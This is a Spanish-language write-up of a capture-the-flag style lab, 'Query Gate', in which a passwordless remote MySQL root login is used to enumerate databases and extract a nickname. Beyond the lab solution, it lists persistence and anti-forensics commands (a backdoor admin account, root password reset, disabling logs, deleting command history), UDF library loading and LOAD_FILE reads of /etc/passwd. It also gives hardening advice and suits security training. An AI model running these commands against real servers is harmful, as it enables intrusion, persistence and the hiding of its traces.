# Penetración MySQL - Query Gate

## Resumen Ejecutivo

Este informe documenta el proceso completo de penetración realizado en la máquina objetivo "Query Gate", donde se identificó y explotó exitosamente una vulnerabilidad en el servicio MySQL para acceder a información crítica. 
La evaluación reveló configuraciones de seguridad inadecuadas que permitieron el acceso no autorizado a bases de datos sensibles.

### Objetivos Cumplidos
- ✅ Identificación de servicios vulnerables
- ✅ Acceso exitoso al sistema de gestión de bases de datos
- ✅ Enumeración completa de bases de datos
- ✅ Extracción de información crítica
- ✅ Identificación del nickname del hacker ético: `h4ckv1s3r`

---

## 1. FASE DE RECONOCIMIENTO

### 1.1 Escaneo de Puertos y Servicios

#### Comando Principal
```bash
nmap -sV <IP_objetivo>
```

#### Comandos Alternativos y Opciones Avanzadas

**Escaneo básico de puertos:**
```bash
nmap <IP_objetivo>
```

**Escaneo completo de todos los puertos:**
```bash
nmap -p- <IP_objetivo>
```

**Escaneo agresivo con detección de OS y scripts:**
```bash
nmap -A <IP_objetivo>
```

**Escaneo específico del puerto MySQL:**
```bash
nmap -p 3306 -sV -sC <IP_objetivo>
```

**Escaneo UDP para servicios adicionales:**
```bash
nmap -sU --top-ports 100 <IP_objetivo>
```

**Escaneo silencioso (stealth):**
```bash
nmap -sS <IP_objetivo>
```

**Escaneo con scripts NSE específicos para MySQL:**
```bash
nmap -p 3306 --script mysql-enum,mysql-info,mysql-databases,mysql-variables <IP_objetivo>
```

### 1.2 Análisis de Resultados

**Puerto Detectado:** 3306/tcp
**Servicio:** MySQL
**Estado:** Abierto
**Versión:** [Detectada por nmap -sV]

#### Verificación Adicional del Servicio
```bash
# Verificar conectividad específica al puerto
nc -zv <IP_objetivo> 3306

# Telnet para prueba manual
telnet <IP_objetivo> 3306

# Banner grabbing con netcat
nc <IP_objetivo> 3306
```

---

## 2. FASE DE ACCESO AL SERVICIO

### 2.1 Conexión a MySQL

#### Comando Principal Utilizado
```bash
mysql -h <IP_objetivo> -u root
```

#### Variantes de Conexión y Opciones

**Conexión con contraseña:**
```bash
mysql -h <IP_objetivo> -u root -p
```

**Conexión especificando puerto:**
```bash
mysql -h <IP_objetivo> -P 3306 -u root -p
```

**Conexión con timeout personalizado:**
```bash
mysql -h <IP_objetivo> -u root -p --connect-timeout=10
```

**Conexión forzando SSL:**
```bash
mysql -h <IP_objetivo> -u root -p --ssl-mode=REQUIRED
```

**Conexión deshabilitando SSL:**
```bash
mysql -h <IP_objetivo> -u root -p --ssl-mode=DISABLED
```

### 2.2 Usuarios Alternativos a Probar

```bash
# Usuarios comunes por defecto
mysql -h <IP_objetivo> -u admin -p
mysql -h <IP_objetivo> -u mysql -p
mysql -h <IP_objetivo> -u test -p
mysql -h <IP_objetivo> -u guest -p
mysql -h <IP_objetivo> -u user -p

# Sin usuario (conexión anónima)
mysql -h <IP_objetivo>
```

### 2.3 Verificación de Acceso Exitoso

**Estado de la conexión:**
```sql
SELECT CONNECTION_ID();
SELECT USER();
SELECT CURRENT_USER();
SELECT VERSION();
```

---

## 3. FASE DE ENUMERACIÓN DE BASES DE DATOS

### 3.1 Comando Principal
```sql
SHOW DATABASES;
```

### 3.2 Comandos Alternativos y Complementarios

**Información del esquema de información:**
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

**Bases de datos con información adicional:**
```sql
SELECT 
    SCHEMA_NAME as 'Database',
    DEFAULT_CHARACTER_SET_NAME as 'Charset',
    DEFAULT_COLLATION_NAME as 'Collation'
FROM INFORMATION_SCHEMA.SCHEMATA;
```

**Contar número de tablas por base de datos:**
```sql
SELECT 
    SCHEMA_NAME as 'Database',
    COUNT(*) as 'Table_Count'
FROM INFORMATION_SCHEMA.TABLES 
GROUP BY SCHEMA_NAME;
```

### 3.3 Resultados Obtenidos

**Bases de datos identificadas:**
1. `information_schema`
2. `mysql`
3. `performance_schema`
4. `sys`
5. `detective_inspector` ← **Base de datos objetivo**

---

## 4. FASE DE SELECCIÓN Y ANÁLISIS DE BASE DE DATOS

### 4.1 Selección de Base de Datos Objetivo

#### Comando Principal
```sql
USE detective_inspector;
```

#### Comandos de Verificación
```sql
SELECT DATABASE();
SHOW TABLES;
```

### 4.2 Análisis de Estructura de Base de Datos

**Información general de la base de datos:**
```sql
SELECT 
    TABLE_NAME,
    TABLE_TYPE,
    ENGINE,
    TABLE_ROWS,
    CREATE_TIME
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'detective_inspector';
```

**Tamaño de las tablas:**
```sql
SELECT 
    TABLE_NAME,
    ROUND(((DATA_LENGTH + INDEX_LENGTH) / 1024 / 1024), 2) as 'Size_MB'
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'detective_inspector';
```

---

## 5. FASE DE IDENTIFICACIÓN DE TABLAS

### 5.1 Comando Principal
```sql
SHOW TABLES;
```

### 5.2 Comandos Alternativos y Análisis Detallado

**Información detallada de tablas:**
```sql
SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'detective_inspector';
```

**Descripción completa de la tabla:**
```sql
DESCRIBE hacker_list;
-- o alternativamente:
SHOW COLUMNS FROM hacker_list;
```

**Estructura detallada con tipos de datos:**
```sql
SELECT 
    COLUMN_NAME,
    COLUMN_TYPE,
    IS_NULLABLE,
    COLUMN_DEFAULT,
    EXTRA
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_SCHEMA = 'detective_inspector' 
AND TABLE_NAME = 'hacker_list';
```

### 5.3 Resultado
**Tabla identificada:** `hacker_list`

---

## 6. FASE DE EXTRACCIÓN DE INFORMACIÓN

### 6.1 Comando Principal
```sql
SELECT * FROM hacker_list;
```

### 6.2 Comandos de Extracción Avanzada

**Conteo de registros:**
```sql
SELECT COUNT(*) FROM hacker_list;
```

**Extracción selectiva de columnas:**
```sql
SELECT nickname FROM hacker_list;
SELECT nickname, email FROM hacker_list;
```

**Extracción con filtros:**
```sql
SELECT * FROM hacker_list WHERE nickname LIKE 'h4ck%';
SELECT * FROM hacker_list ORDER BY nickname;
```

**Extracción con límites:**
```sql
SELECT * FROM hacker_list LIMIT 10;
SELECT * FROM hacker_list LIMIT 5 OFFSET 2;
```

### 6.3 Comandos de Exportación

**Exportar a archivo CSV:**
```sql
SELECT * FROM hacker_list 
INTO OUTFILE '/tmp/hacker_list.csv' 
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"' 
LINES TERMINATED BY '\n';
```

**Crear respaldo de la tabla:**
```sql
CREATE TABLE hacker_list_backup AS SELECT * FROM hacker_list;
```

### 6.4 Información Crítica Extraída

**Nickname del hacker ético identificado:** `h4ckv1s3r`

---

## 7. COMANDOS ADICIONALES DE POST-EXPLOTACIÓN

### 7.1 Enumeración de Privilegios

```sql
SHOW GRANTS FOR CURRENT_USER();
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
SELECT * FROM mysql.user WHERE User = 'root'\G
```

### 7.2 Información del Sistema

```sql
SELECT VERSION();
SELECT @@hostname;
SELECT @@datadir;
SELECT @@basedir;
SHOW VARIABLES LIKE 'version%';
SHOW STATUS;
```

### 7.3 Enumeración de Usuarios

```sql
SELECT User, Host FROM mysql.user;
SELECT DISTINCT User FROM mysql.user;
```

### 7.4 Análisis de Logs

```sql
SHOW VARIABLES LIKE 'log%';
SHOW VARIABLES LIKE '%log%';
```

---

## 8. TÉCNICAS DE PERSISTENCIA

### 8.1 Creación de Usuario Backdoor

```sql
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password123';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
FLUSH PRIVILEGES;
```

### 8.2 Modificación de Usuarios Existentes

```sql
UPDATE mysql.user SET Password=PASSWORD('newpass') WHERE User='root';
FLUSH PRIVILEGES;
```

---

## 9. TÉCNICAS DE LIMPIEZA DE HUELLAS

### 9.1 Limpieza de Logs

```sql
-- Verificar logs habilitados
SHOW VARIABLES LIKE 'general_log';
SHOW VARIABLES LIKE 'log_bin';

-- Limpiar logs generales (si están habilitados)
SET GLOBAL general_log = 'OFF';
-- Truncar archivo de log manualmente
```

### 9.2 Eliminación de Historia

```sql
-- Limpiar historia de comandos MySQL
\! rm ~/.mysql_history
```

---

## 10. HERRAMIENTAS COMPLEMENTARIAS

### 10.1 SQLMap para Automatización

```bash
# Escaneo básico de vulnerabilidades SQL
sqlmap -u "http://target/login.php" --data="username=admin&password=admin"

# Enumeración de bases de datos
sqlmap -u "target_url" --dbs

# Enumeración de tablas
sqlmap -u "target_url" -D detective_inspector --tables

# Volcado de datos
sqlmap -u "target_url" -D detective_inspector -T hacker_list --dump
```

### 10.2 MySQLDump para Respaldos

```bash
# Respaldar base de datos específica
mysqldump -h <IP_objetivo> -u root detective_inspector > backup.sql

# Respaldar todas las bases de datos
mysqldump -h <IP_objetivo> -u root --all-databases > full_backup.sql

# Respaldar estructura sin datos
mysqldump -h <IP_objetivo> -u root --no-data detective_inspector > structure.sql
```

### 10.3 Herramientas de Análisis

**MySQL Workbench (GUI):**
```bash
# Conexión gráfica para análisis visual
mysql-workbench
```

**DBeaver (Multiplataforma):**
```bash
# Herramienta universal de base de datos
dbeaver
```

---

## 11. VECTORES DE ESCALACIÓN DE PRIVILEGIOS

### 11.1 Análisis de Configuración

```sql
-- Verificar configuración de seguridad
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'local_infile';

-- Verificar plugins cargados
SHOW PLUGINS;
SELECT * FROM INFORMATION_SCHEMA.PLUGINS;
```

### 11.2 User Defined Functions (UDF)

```sql
-- Verificar capacidad de crear funciones
SELECT * FROM mysql.func;

-- Intentar cargar librerías externas (si se tienen permisos)
CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
```

### 11.3 Lectura de Archivos del Sistema

```sql
-- Intentar leer archivos del sistema (si load_file está disponible)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/proc/version');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
```

---

## 12. RECOMENDACIONES DE SEGURIDAD

### 12.1 Para el Administrador del Sistema

1. **Configuración de Autenticación:**
   - Deshabilitar acceso root remoto
   - Implementar contraseñas robustas
   - Configurar autenticación por certificados

2. **Configuración de Red:**
   - Restringir acceso por IP
   - Implementar firewall con reglas específicas
   - Usar túneles SSH para conexiones remotas

3. **Configuración de MySQL:**
   - Deshabilitar `local_infile`
   - Configurar `secure_file_priv`
   - Limitar privilegios de usuarios

### 12.2 Comandos de Hardening

```sql
-- Eliminar usuarios anónimos
DELETE FROM mysql.user WHERE User='';

-- Eliminar base de datos de prueba
DROP DATABASE IF EXISTS test;

-- Actualizar privilegios
FLUSH PRIVILEGES;
```

---

## 13. CONCLUSIONES Y HALLAZGOS

### 13.1 Vulnerabilidades Identificadas

1. **Acceso Root Sin Contraseña:** El usuario root puede conectarse remotamente sin autenticación
2. **Falta de Restricciones de Red:** No hay limitaciones de IP para conexiones MySQL
3. **Configuración Insegura:** Valores por defecto que permiten acceso no autorizado

### 13.2 Impacto de Seguridad

- **Severidad:** Crítica
- **Confidencialidad:** Comprometida totalmente
- **Integridad:** En riesgo
- **Disponibilidad:** Potencialmente afectada

### 13.3 Datos Críticos Extraídos

| Campo | Valor |
|-------|--------|
| **Nickname Objetivo** | `h4ckv1s3r` |
| **Base de Datos** | `detective_inspector` |
| **Tabla** | `hacker_list` |
| **Método de Acceso** | MySQL Root sin contraseña |

### 13.4 Operación Exitosa

✅ **Reconocimiento:** Puerto 3306 identificado correctamente  
✅ **Acceso:** Conexión establecida con privilegios administrativos  
✅ **Enumeración:** 5 bases de datos catalogadas  
✅ **Exploración:** Tabla objetivo localizada  
✅ **Extracción:** Información crítica obtenida  
✅ **Objetivo:** Nickname `h4ckv1s3r` identificado exitosamente

---

## 14. ANEXOS

### 14.1 Log de Comandos Ejecutados

```sql
-- Secuencia completa de comandos utilizados
mysql -h <IP_objetivo> -u root
SHOW DATABASES;
USE detective_inspector;
SHOW TABLES;
SELECT * FROM hacker_list;
```

### 14.2 Scripts de Automatización

```bash
#!/bin/bash
# Script de automatización para Query Gate
echo "=== Query Gate Penetration Script ==="
echo "Connecting to MySQL..."
mysql -h $1 -u root -e "
SHOW DATABASES;
USE detective_inspector;
SHOW TABLES;
SELECT * FROM hacker_list;
"
```

### 14.3 Evidencias

- Puerto 3306 confirmado abierto
- Acceso root sin contraseña verificado
- Base de datos `detective_inspector` confirmada
- Tabla `hacker_list` identificada
- Registro con nickname `h4ckv1s3r` extraído

---
